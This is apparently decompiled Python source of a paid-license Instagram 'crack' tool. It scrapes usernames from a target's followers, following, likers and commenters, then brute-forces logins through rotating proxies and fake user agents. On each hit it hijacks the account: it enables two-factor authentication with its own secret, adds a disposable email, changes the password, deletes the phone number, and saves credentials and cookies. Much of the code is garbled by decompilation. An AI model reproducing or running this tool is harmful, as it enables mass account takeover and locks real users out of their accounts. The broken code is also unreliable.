...
class Require:
    ...
    def socks(self, item = ([],)):
        ...
        for i in resp.text.splitlines():
            if i.isdigit and i not in item:
                item.append(i)
    ...
    def UserAgent(self):
        ...
        ua3 = f'''Instagram {versi} Android ({andro}; {dpis}; {pxl}; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; {basa}; {kode})'''
        uaa = rc([
            ua1,
            ua2,
            ua3])
...
# Generates a random 6-character build string
build = (lambda: ''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(6)))()
...
headers = {
    ...
    def AktifkanA2f(self, cokie, code, resp, auth):
        ...
        ondw = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {
            'cookie': cokie }).text
        if '"success":true' in str(ondw):
            ...
            reco = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {
                'cookie': cokie }).text
...
random.choice(abcde)None)(range(5)())
        ...
        data.update({
            ...
            'variables': json.dumps({
                ...
                'selected_accounts': [
                    f'''{self.AccountId(resp)}'''],
                'family_device_id': 'device_id_fetch_ig_did',
                'client_mutation_id': 'mutation_id_1700479648287' }),
            'doc_id': '6970150443042883' })
        xxnx = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {
            'cookie': cookie }).text
        if '"success":true' in str(xxnx):
            ...
            data.update({
                ...
                'variables': json.dumps({
                    ...
                    'selected_accounts': [
                        f'''{self.AccountId(resp)}'''],
                    'family_device_id': 'device_id_fetch_ig_did',
                    'client_mutation_id': 'mutation_id_1700481379041',
            ...
            dihi = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {
                'cookie': cookie }).text
            if '"success":true' in str(dihi):
                self.ex.update({
                    'di-konfirmasi': True,
                    'Url': url })
            self.ex.update({
        ...
        self.ex.update({
            'di-konfirmasi': False })
        self.ex.update({
            'email': f'''{email} Tidak Di Tambahkan''',
            'Url': None })
        self.ex.update({
            'di-konfirmasi': False })
        self.ex.update({
        ...
        if len(key) > 0 or len(xxx) > 0:
            ...
            for yxz in sdr.find_all('td'):
                if 'Harap konfirmasi alamat email ini agar kami dapat memperbarui informasi kontak Anda. Anda mungkin diminta untuk memasukkan kode konfirmasi ini:' in str(yxz) or 'Harap konfirmasi alamat email ini' in sdr:
                    ...
                    if len(kode) > 0:
                        (kode[0], f'''https://inboxkitten.com/inbox/{nama}/list''')
                        return None
                return None
...
random.choice(abcd)None)(range(8)())
        resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies = {
            'cookie': cookie }).text
        head = self.headers_graph(resp)
        head.update({
        ...
        data.update({
            ...
            'variables': json.dumps({
                'account_id': self.AccountId(resp),
                'account_type': 'INSTAGRAM',
                'current_password_enc': {
                    'sensitive_string_value': pw_old },
                'new_password_enc': {
                    'sensitive_string_value': new_pw },
                'new_password_confirm_enc': {
                    'sensitive_string_value': new_pw },
                'client_mutation_id': self.ClientId(resp) }),
            'doc_id': '4872350656193366' })
        xnxx = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {
            'cookie': cookie }).text
    ...
    def GetPhone(self, cookie, status = ({ },)):
        ...
        if '"all_contact_points"' in str(xnxx):
            ...
            data.update({
                ...
                'variables': json.dumps({
                    'normalized_contact_point': pone,
                    'contact_point_type': 'PHONE_NUMBER',
                    'selected_accounts': [
                        f'''{self.AccountId(resp)}'''],
                    'client_mutation_id': 'mutation_id_1700749992848',
                    'family_device_id': 'device_id_fetch_ig_did' }),
                'doc_id': '6716611361758391' })
            haps = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {
                'cookie': cookie }).text
            if '"success":false' in haps:
                status.update({
                    'Dihapus': False,
                    'Number': pone })
            status.update({
...
class Brute:
    ...
    def Path(self):
        if os.path.isfile('data/user/login/cokie.txt') is True:
            ...
            req = requests.get(f'''https://i.instagram.com/api/v1/users/{uid}/info/''', headers = xyz, cookies = {
                'cookie': cokie }).json()['user']['full_name']
            req1 = requests.get(f'''https://i.instagram.com/api/v1/users/{uid}/info/''', headers = xyz, cookies = {
                'cookie': cokie }).json()['user']['follower_count']
            req2 = requests.get(f'''https://i.instagram.com/api/v1/users/{uid}/info/''', headers = xyz, cookies = {
                'cookie': cokie }).json()['user']['following_count']
            req3 = requests.get(f'''https://i.instagram.com/api/v1/users/{uid}/info/''', headers = xyz, cookies = {
                'cookie': cokie }).json()['user']['username']
    ...
    def Login(self):
        ...
        urut = []
        urut.append(Panel(f'''{H2}{self.g4}''', title = 'IP', subtitle = f'''{B2}{self.g3}''', padding = (0, 2)))
        ...
        if 'ds_user_id' in cokie:
            ...
            prints(Panel(f'''{H2}{uid}''', title = 'ID', subtitle = f'''{B2}{req}''', width = 80, padding = (0, 28), style = 'bold grey100'))
            time.sleep(5.2)
            self.Menu()
            return None
        if Exception:
            e = None
            console.print(f''' {P2}[{H2}*{P2}] Cookie yang anda masukan invalid atau kedaluwarsa''')
            time.sleep(3)
            sys.exit()
            e = None
            del e
    ...
    def Menu(self, sisa = (None,)):
        ...
        b = requests.get(f'''https://app.cryptolens.io/api/key/Activate?token=\'WyI4NjQ0OTg4OSIsImdrRzZGSUxYVTZRaVNxd0NKdGdXdDFwZythWW5kRWViZ2l1cHd0dzIiXQ==&ProductId=26095&Key={askey}''').json()
        c = b['licenseKey']
        key = c['key'][0:11]
        tahun = c['expires'][0:4]
        buln = c['expires'][5:7]
        ...
        self.g4 = requests.Session().get('http://ip-api.com/json').json()['query']
        urut = []
        urut.append(Panel(f'''{N2} NAMA {H2}@{userku}\n{N2} IP ANDA {H2}{self.g4}''', width = 35, padding = (0, 1), style = 'bold green'))
        Console().print(Columns(urut))
        tab = Table()
        tab.add_column(f'''{B2}NO.''', style = 'bold green', justify = 'center')
        tab.add_column(f'''{B2}MENU''', style = 'bold red', justify = 'center', width = 43)
        tab.add_row(f'''{O2}01.''', f'''{H2}CRACK DARI PENGIKUT''')
        tab.add_row(f'''{O2}02.''', f'''{H2} CRACK DARI MENGIKUTI''')
        tab.add_row(f'''{O2}03.''', f'''{H2} CRACK DARI KOMENTAR''')
    ...
    def input_menu(self, kueh, exp):
        ...
        if x == '1' and x == '01' and x == '2' or x == '02':
            prints(Panel(f'''{O2}Masukan username target''', width = 80, padding = (0, 3), style = 'bold green'))
            ...
            if len(self.id) > 0:
                self.methode()
                return None
            False(Panel(f'''{O2}TARGET PRIVAT AJG''', width = 80, padding = (0, 3), style = 'bold green'))
            time.sleep(3.3)
            self.Menu(exp)
            return None
        if x == '3' or x == '03':
            prints(Panel(f'''{O2}Masukan link post target pastikan vidio publik jangan private''', width = 80, padding = (0, 4), style = 'bold green'))
            ...
            for uid in medi:
                ...
                return None
                if x == '4' or x == '04':
                    file = open('data/user/login/CP.txt', 'r').read()
                    console.print(f''' {P2}[{H2}*{P2}] Opshhh terjadi kesalahan..''')
                    time.sleep(3)
                    sys.exit()
                    for res in file.splitlines():
                        pswd = res.split('|')[1]
                        user = res.split('|')[0]
                        formatusr = f'''{user!s}<=>{pswd!s}'''
                        if formatusr not in self.id:
                            self.id.append(formatusr)
                        if IndexError:
                            pass
                        prints(Panel(f'''{P2}Terdapat{K2} {len(self.id)} {P2}akun chekpoint, apakah anda ingin crack ulang?''', width = 80, padding = (0, 4), style = 'bold red'))
                        time.sleep(2.1)
                        ...
                        if x == '00' or x == '000':
                            q = 0
                            tab = Table()
                            tab.add_column(f'''{P2}NO.''', style = 'bold red', justify = 'center')
                            tab.add_column(f'''{P2}MENU''', style = 'bold red', justify = 'center', width = 43)
                            tab.add_column(f'''{P2}INFO''', style = 'bold red', justify = 'center')
                            ...
                            Console().print(tab, justify = 'center', style = 'bold red')
                            ...
                            for w in open(f'''data/user/login/{dir}''', 'r').read().splitlines():
                                ...
                                sys.exit()
                                return None
                                if x == 'lain' and x == 'Lain' or x == 'LAIN':
                                    prints(Panel(f'''{P2}Mohon maaf menu {H2}BOT{P2} masih dalam tahap perkembangan oleh admin''', width = 80, padding = (0, 4), style = 'bold green'))
                                    time.sleep(3.3)
                                    self.Menu(exp)
                                    return None
                                if None == 'hapus' and x == 'Hapus' or x == 'HAPUS':
                                    ...
                                    if rok == 'Y' or rok == 'y':
                                        ...
                                        prints(Panel(f'''{P2}Berhasil menghapus data {H2}LISENSI {P2}anda terima kasih untuk semuanya''', width = 80, padding = (0, 2), style = 'bold green'))
                                        time.sleep(3)
                                        sys.exit()
                                        return None
                                    None.Menu(exp)
                                ...
                                if None == '0' or x == '00':
                                    ...
                                    if rok == 'Y' or rok == 'y':
                                        ...
                                        prints(Panel(f'''{P2}Berhasil menghapus data login akun anda terimakasih untuk semuanya''', width = 80, padding = (0, 1), style = 'bold green'))
                                        time.sleep(3)
                                        sys.exit()
                                        return None
                                    None.Menu(exp)
    ...
    def GetUserComment(self, cookie, media_id, max_min):
        ...
        for y in response['comments']:
            format = f'''{y['user']['username']!s}<=>{y['user']['full_name']!s}'''
    ...
    def Likes(self, cokie, mediaid):
        ...
        req = requests.get(f'''https://www.instagram.com/api/v1/media/{mediaid}/likers/''', cookies = {
            'cookie': cokie }, headers = self.head).json()
        for data in req['users']:
            xnxz = f'''{data['username']!s}<=>{data['full_name']!s}'''
            console.print(f''' {P2}[{H2}*{P2}] Berhasil mengumpulkan {H2}{len(self.id)}{P2} userId...''', end = '\r')
            if xnxz not in self.id:
                self.id.append(xnxz)
            return None
            return None
    ...
    def dump_acc(self, cokie, users, type, max_id):
        ...
        for user in users:
            self.param.update({
                'max_id': max_id })
            req = requests.get(f'''https://www.instagram.com/api/v1/friendships/{user}/{xnxx}/''', params = self.param, headers = self.head, cookies = {
                'cookie': cokie }).json()
            for data in req['users']:
                xnxz = f'''{data['username']!s}<=>{data['full_name']!s}'''
                console.print(f''' {P2}[{H2}*{P2}] Berhasil mengumpulkan {H2}{len(self.id)}{P2} userId...''', end = '\r')
                if xnxz not in self.id:
                    self.id.append(xnxz)
                if 'next_max_id' in str(req):
                    self.dump_acc(cokie, users, type, req['next_max_id'])
            'followers'
            return self.id
    ...
    def methode(self):
        self.kumpul()
        tab = Table()
        tab.add_column(f'''{P2}NO.''', style = 'bold green', justify = 'center')
        tab.add_column(f'''{P2}METHODE''', style = 'bold green', justify = 'center', width = 43)
        tab.add_row(f'''{H2}01.''', f'''{H2} metode gan1''')
        Console().print(tab, justify = 'center', style = 'bold green')
        xyz = console.input(f''' {O2} Masukan pilihan [1/2/3] : ''')
        prints(Panel(f'''{O2} GANTI DATA AKUN? ''', width = 80, padding = (0, 4), style = 'bold green'))
        yxz = console.input(f''' {O2} TAMPILKAN A2F?? [Y/t] : ''').lower()
        prints(Panel(f'''{O2} TAMPILKAN HASIL CP?''', width = 80, padding = (0, 11), style = 'bold green'))
        ...
        if fol in ('ya', 'y'):
            ...
            if len(uuid) > 0:
                open('.idakunlu.txt', 'w').write(f'''{uuid[0]}''')
    ...
    def exec_malink(self, methode_login, re_data, show_off, fol):
        ...
        bulan = [
            ...
            'Desember']
        apacb = datetime.now()
        kontl = f'''{bulan[apacb.month - 1]!s}/{apacb.day!s}/{apacb.year!s}'''
        prints(Panel(f'''{H2}HASIL DI SIMPAN!!''', width = 80, padding = (0, 5), style = 'green'))
        urut.append(Panel(f'''{H2}{okc}''', width = 35, padding = (0, 5), style = 'bold green'))
        urut.append(Panel(f'''{K2}{cpc}''', width = 35, padding = (0, 5), style = 'bold green'))
        Console().print(Columns(urut))
        prog = Progress(SpinnerColumn('clock'), TextColumn('{task.description}'), BarColumn(), TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('', total = len(self.id))
        prog
        bol = executor(max_workers = 25)
        for kontol in self.id:
            ...
            if fol in ('y', 'ya'):
                pass
            followlu = None
            if methode_login in ('1', '01'):
                bol.submit(self.ExecLogin, username, password, hapus_dt, show_chk, followlu)
            if methode_login in ('2', '02'):
                bol.submit(self.ExecAjax, username, password, hapus_dt, show_chk, followlu)
            if methode_login in ('3', '03'):
                bol.submit(self.ExecThreads, username, password, hapus_dt, show_chk, followlu)
            if methode_login in ('4', '04'):
                bol.submit(self.EXECApi_Ajax, username, password, hapus_dt, show_chk, followlu)
            bol.submit(self.ExecLogin, username, password, hapus_dt, show_chk, followlu)
            None(None, None)
            if not True:
                pass
        ...
        print('\n')
        xnxx = []
        xnxx.append(Panel(f'''Total OK {H2}{self.ok}''', width = 23, padding = (0, 1), style = 'bold green'))
        xnxx.append(Panel(f'''Total CP {K2}{self.cp}''', width = 23, padding = (0, 1), style = 'bold green'))
        xnxx.append(Panel(f'''{P2}Total A2F {M2}{self.tw}''', width = 23, padding = (0, 1), style = 'bold green'))
    ...
    def ExecLogin(self, user, passwd, remove_all, show_change_acc, followlu, file = (None, None, None, 'data/user/login/')):
        ...
        kont = random.randint
        uaig = requ.UserAgent()
        curl = byps.get('https://www.instagram.com/api/v1/web/data/shared_data/', headers = {
            'User-Agent': uaig })
        vit = random.choice([
            f'''{M2}√''',
            f'''{O2}√''',
        ...
        payload = {
            ...
            'queryParams': '{}',
            'optIntoOneTap': 'false' }
        cookies = (lambda .0: for name, value in .0:
[ f'''{name!s}={value!s}''' ])(byps.cookies.get_dict().items()())
        if requests.exceptions.ConnectionError:
            ';'.join
            time.sleep(5)
            self.ExecLogin(user, passwd, remove_all, show_change_acc, followlu, file = 'data/user/login/')
        '567067343352427'
        for pswd in passwd:
            if pswd:
                payload.update({
                ...
                prok = {
                    'http': 'socks5://' + random.choice(prox) }
                resp = byps.post('https://i.instagram.com/api/v1/accounts/login/', cookies = {
                    'cookie': cookies }, data = xnxx, headers = headers, proxies = prok)
                if 'logged_in_user' in str(resp.text):
                    (self.ok += 1).ok = 'X-IG-App-ID'
                    cookie = (lambda .0: for name, value in .0:
[ f'''{name!s}={value!s}''' ])(byps.cookies.get_dict().items()())
                    (followers, following, postingan) = self.friends_user(user)
                    akunfb = self.Fafo(cookie)
                    on_authen = requ.OnAuthenA2f(cookie)
                    status = on_authen['success-a2f']
                    secretkey = on_authen['SecretKey']
                    pemulihan = on_authen['kode-pemulihan']
                    if status is not False:
                        pass
                    aktif_ora = 'Tidak Aktif'
                    ganti_mail = requ.AddEmail(cookie)
                    status_email = ganti_mail['di-konfirmasi']
                    email = ganti_mail['email']
                    curl = ganti_mail['Url']
                    if status_email is True:
                        pass
                    konfirmasi_ora = ''
                    ganti_sandi = requ.RePassword(cookie, pswd)
                    dadi_ora = f'''{ganti_sandi}'''
                    telepon = requ.GetPhone(cookie)
                    phone = telepon['Number']
                    status_pon = telepon['Dihapus']
                    if status_pon is True:
                        pass
                    khamdihi = f'''{phone} {P2}Tidak Di Hapus'''
                    cetak(panel(f'''[bold white][[bold green]√[bold white]] NAMA [bold white] [bold green]{user}\n[bold white][[bold green]√[bold white]] SANDI [bold white] [bold green]{dadi_ora}\n[bold white][[bold green]√[bold white]] PENGIKUT [bold white]  [bold green]{followers}\n[bold white][[bold green]√[bold white]] KODE A2F [bold white] [bold red]{pemulihan}\n[bold white][[bold green]√[bold white]] NOMOR [bold white] [bold green]{khamdihi}\n[bold white][[bold green]√[bold white]] facebook acc [bold white] [bold green]{akunfb}\n[bold white][[bold green]√[bold white]] USERAGENT [bold white] [bold purple]{headers['User-Agent']}''', title = '[bold white][ [bold white] GAN LIVE[bold white]]', style = 'bold green'))
                    save = f'''{user}|{dadi_ora}|{email}|{curl}|{secretkey}|{pemulihan}|{cookie}\n'''
                    if Exception:
                        e = f'''{phone} {P2}Di Hapus'''
                        cetak(panel(f'''[bold white][[bold green]√[bold white]] AkunFB [bold white] [bold green]{akunfb}\n[bold white][[bold green]√[bold white]] Username [bold white]: [bold green]{user}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold green]{pswd}\n[bold white][[bold green]√[bold white]] Cookie [bold white]: [bold green]{cookie}''', title = '[bold white][ [bold green]LIVE [bold white]]', style = 'bold green'))
                        save = f'''{user}|{pswd}|{cookie}\n'''
                        e = None
                        del e
                        e = None
                        del e
                    cetak(panel(f'''[bold white][[bold green]√[bold white]] AkunFB [bold white] [bold green]{akunfb}\n[bold white][[bold green]√[bold white]] Username [bold white]: [bold green]{user}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold green]{pswd}\n[bold white][[bold green]√[bold white]] Followers [bold white]: [bold green]{followers}\n[bold white][[bold green]√[bold white]] Following [bold white]: [bold green]{following}\n[bold white][[bold green]√[bold white]] Postingan [bold white]: [bold green]{postingan}\n[bold white][[bold green]√[bold white]] Cookie [bold white]¥ [bold green]{cookie} {uaig}''', title = '[bold white][ [bold green]SUCCES [bold white]]', style = 'bold green'))
                    save = f'''{user}|{pswd}|{cookie}\n'''
                    sv = open(file + 'OK.txt', 'a', encoding = 'utf-8')
                    sv.write(save)
                    sv.close()
                    None(None, None)
                    if not f'''{pswd}''':
                    ...
                    remove_all
                if 'two_factor_required' in str(resp.text):
                    ...
                    '3brTvwE='
                if 'https://i.instagram.com/challenge/' in str(resp.text):
                    if show_change_acc is True:
                        cetak(panel(f'''[bold white][[bold green]√[bold white]] Username [bold white]: [bold green]{user}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold green]{pswd}\n[bold white][[bold green]√[bold white]] Followers [bold white]: [bold green]{followers}\n[bold white][[bold green]√[bold white]] Following [bold white]: [bold green]{following}\n[bold white][[bold green]√[bold white]] Postingan [bold white]: [bold green]{postingan}\n[bold white][[bold green]√[bold white]] Cookie [bold white]¥ [bold green]{cookie} {uaig}''', title = '[bold white][ [bold green]SUCCES [bold white]]', style = 'bold cyan'))
                    (self.cp += 1).cp = 'X-IG-Capabilities'
                    open(file + 'CP.txt', 'a', encoding = 'utf-8').write(f'''{user}|{pswd}\n''')
                    'WIFI'
                if requests.exceptions.ConnectionError:
                    'X-IG-Connection-Type'
                    time.sleep(10)
                    self.ExecLogin(user, passwd, remove_all, show_change_acc, file = 'data/user/login/')
            (self.lp += 1).lp = 'false'
            return None
...
class AssetAndKey:
    ...
    def Keys(self):
        ...
        urut.append(Panel(f'''{H2}{self.g4}''', title = 'IP', subtitle = f'''{B2}{self.g3}''', padding = (0, 2)))
        Console(width = 70, style = 'bold grey100').print(Columns(urut), justify = 'center')
        prints(Panel(f'''{P2}Silahkan masukan lisensi atau apikey server IBF Tools, jika anda belum memiliki {K2}lisensi atau apikey server{P2} anda bisa ketik {H2}GET {P2}dan ketik {B2}INFO {P2}untuk melihat harga lisensi atau apikey''', width = 80, padding = (0, 2), style = 'bold grey100'))
        auth = console.input(f''' {P2}[{H2}*{P2}] Masukan lisensi atau Apikey : ''')
        xnxx = auth.lower()
        if auth == "'Info'" and auth == 'INFO' or auth == 'info':
            tab = Table()
            tab.add_column(f'''{P2}NO.''', style = 'bold grey100', justify = 'center')
            tab.add_column(f'''{P2}MENU''', style = 'bold grey100', justify = 'center', width = 43)
            tab.add_column(f'''{P2}PRICE''', style = 'bold grey100', justify = 'center')
            ...
            Console().print(tab, justify = 'center', style = 'bold grey100')
            ...
            if ykh == '1' or ykh == '01':
                ...
                os.system('xdg-open https://wa.me/+6283861183874?text=Mas%20beli%20lisensi%20IBF%2C%20durasi%201%20minggu%20dong')
                time.sleep(3.1)
                self.Keys()
                return None
            if None == '2' or ykh == '02':
                console.print(f''' {P2}[{H2}*{P2}] Tunggu sebentar anda akan di arahkan ke WhatsApp admin''')
                os.system('xdg-open https://wa.me/+626285183481311?text=Mas%20beli%20lisensi%20IBF%2C%20durasi%201%20bulan%20dong')
                time.sleep(3.1)
                self.Keys()
                return None
            if None == '3' or ykh == '03':
                console.print(f''' {P2}[{H2}*{P2}] Tunggu sebentar anda akan di arahkan ke WhatsApp admin''')
                os.system('xdg-open https://wa.me/+6285183481311?text=Mas%20beli%20open%20source%20IBF%20dong')
                time.sleep(3.1)
                self.Keys()
                return None
            None.keys()
            return None
        if None == 'get' and auth == "'Get'" or auth == 'GET':
            console.print(f''' {P2}[{H2}*{P2}] Tunggu sebentar anda akan di arahkan ke WhatsApp admin''')
            os.system('xdg-open https://wa.me/+6285183481311?text=*Assalamualaikum%20mas%20mau%20beli%20lisensi%20IBF%20tools%20dong*')
            time.sleep(3.1)
            self.Keys()
            return None
        if None(auth) <= 5:
    ...
    def confirm(self, keys, token, produc_id = ('WyI4NjQ0OTg4OSIsImdrRzZGSUxYVTZRaVNxd0NKdGdXdDFwZythWW5kRWViZ2l1cHd0dzIiXQ==', '26095')):
        ...
        date = f'''{int(tanggal)!s}{int(bulan)!s}{int(tahun)!s}'''
        neww = f'''{hari!s}{buln!s}{thun!s}'''
        if len(neww) == 7:
            neww = f'''0{hari!s}{buln!s}{thun!s}'''
        neww = neww
        form = '%d%m%Y'
        ...
        if sisa < 1:
            ...
            prints(Panel(f'''{P2}Opshhh lisensi yang kamu miliki sudah kedaluwarsa''', width = 80, padding = (0, 10), style = 'bold grey100'))
            time.sleep(3)
            sys.exit()
            return None
        None.byps.Clear()
        self.byps.Logos()
        prints(Panel(f'''{P2}Selamat lisensi yang anda masukan terdaftar ke server IBF''', width = 80, padding = (0, 6), style = 'bold grey100'))
        time.sleep(2.1)
        urut = []
        urut.append(Panel(f'''{P2}Sisa {H2}{sisa} {P2}hari lagi''', title = 'Time', padding = (0, 3)))
        Console(width = 70, style = 'bold grey100').print(Columns(urut), justify = 'center')
        time.sleep(3.5)
...
class Lisensi:
    ...
    def __init__(self):
        ...
        self.token = 'WyI4NjQ0OTg4OSIsImdrRzZGSUxYVTZRaVNxd0NKdGdXdDFwZythWW5kRWViZ2l1cHd0dzIiXQ=='
        self.bulan_ttl = {
            '01': 'Januari',
            '02': 'Februari',
            '03': 'Maret',
    ...
    def pasteLisen(self):
        self.clearTerminal()
        self.byps.Logos()
        prints(Panel(f'''{P2}[{H2}+{P2}] silahkan masukkan lisensi tools yang anda miliki ya\n{P2}[{H2}+{P2}] belum mempunyai lisensi? ketik {P2}( {H2}beli{P2} ) untuk melihat harga''', width = 80, padding = (0, 1), style = 'bold grey100'))
        set = Console().input(f'''  {P2}[{H2}?{P2}] masukan lisensi tools : ''')
        if set == '' or set == '':
            prints(Panel(f'''{P2}[{M2}!{P2}] opshhh silahkan masukan lisensi anda dan jangan kosong''', width = 80, padding = (0, 1), style = 'bold grey100'))
            sleep(3)
            self.pasteLisen()
        if set == 'beli' and set == 'Beli' or set == 'BELI':
            self.Harga()
        ...
        prints(Panel(f'''{P2}[{H2}✓{P2}] selamat lisensi yang anda masukan terdaftar ke server kami''', width = 80, padding = (0, 1), style = 'bold grey100'))
        sleep(3)
        self.chekData()
        sys.exit()
        return None
        if KeyError:
            e = None
            prints(Panel(f'''{P2}[{M2}!{P2}] opshh lisensi yang anda masukan tidak terdaftar di server''', width = 80, padding = (0, 1), style = 'bold grey100'))
            sleep(3)
            sys.exit()
            e = None
            del e
        ...
        e = None
        del e
        if (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout):
            e = None
            prints(Panel(f'''{P2}[{M2}!{P2}] koneksi internet kamu hilang pastikan terhubung dengan WiFi ya''', width = 80, padding = (0, 1), style = 'bold grey100'))
            sleep(3)
            sys.exit()
            e = None
            del e
    ...
    def Harga(self):
        ...
        if bool == '' or bool == '':
            prints(Panel(f'''{P2}[{M2}!{P2}] opshhhh silahkan masukan pilihan yang tersedia di atas ya''', width = 80, padding = (0, 1), style = 'bold grey100'))
            sleep(3)
            self.pasteLisen()
            return None
        if None == '1' or bool == '01':
            self.WhatsApp()
            sleep(3)
            self.pasteLisen()
            return None
        if None == '2' or bool == '02':
            self.WhatsApp()
            sleep(3)
            self.pasteLisen()
            return None
        if None == '3' or bool == '03':
            self.WhatsApp()
            sleep(3)
            self.pasteLisen()
            return None
        None(Panel(f'''{P2}[{M2}!{P2}] opshhhh silahkan masukan pilihan yang tersedia di atas ya''', width = 80, padding = (0, 1), style = 'bold grey100'))
        sleep(3)
        self.pasteLisen()
    ...
    def chekData(self):
        ...
        bulan1 = 'None'
        tahun1 = 'None'
        [][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] lisensi : '][f'''{H2}'''][f'''{key}''']['-****-****\n'][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] join    : '][f'''{H2}'''][f'''{tanggal1}'''][' '][f'''{bulan1}'''][' '][f'''{tahun1}''']['\n'][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] expired : '][f'''{H2}'''][f'''{tanggal}'''][' ']([][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] lisensi : '][f'''{H2}'''][f'''{key}''']['-****-****\n'][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] join    : '][f'''{H2}'''][f'''{tanggal1}'''][' '][f'''{bulan1}'''][' '][f'''{tahun1}''']['\n'][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] expired : '][f'''{H2}'''][f'''{tanggal}'''][' '][f'''{bulan}''']([][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] lisensi : '][f'''{H2}'''][f'''{key}''']['-****-****\n'][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] join    : '][f'''{H2}'''][f'''{tanggal1}'''][' '][f'''{bulan1}'''][' '][f'''{tahun1}''']['\n'][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] expired : '][f'''{H2}'''][f'''{tanggal}'''][' '][f'''{bulan}'''][' ']([][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] lisensi : '][f'''{H2}'''][f'''{key}''']['-****-****\n'][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] join    : '][f'''{H2}'''][f'''{tanggal1}'''][' '][f'''{bulan1}'''][' '][f'''{tahun1}''']['\n'][f'''{P2}''']['['][f'''{H2}''']['*'][f'''{P2}''']['] expired : '][f'''{H2}'''][f'''{tanggal}'''][' '][f'''{bulan}'''][' '][f'''{tahun}''']), padding = (0, 1), style = 'bold grey100'))
        Console(width = 70, style = 'bold grey100').print(Columns(urut), justify = 'center')
        sleep(3)
    ...
    def ChekingLisensi(self):
        ...
        if KeyError:
            e = None
            prints(Panel(f'''{P2}[{M2}!{P2}] opshhh lisensi yang kamu miliki sudah kedaluwarsa''', width = 80, padding = (0, 1), style = 'bold grey100'))
            self.removeLisensi()
            sleep(3)
            self.WhatsApp()
            e = None
...
if requests.exceptions.ConnectionError:
    e = None
    prints(Panel(f'''{P2}Koneksi kamu buruk pastikan terhubung dengan internet atau WiFi ya''', width = 80, padding = (0, 1), style = 'bold grey100'))
    time.sleep(3.1)
    sys.exit()
    e = None
    del e
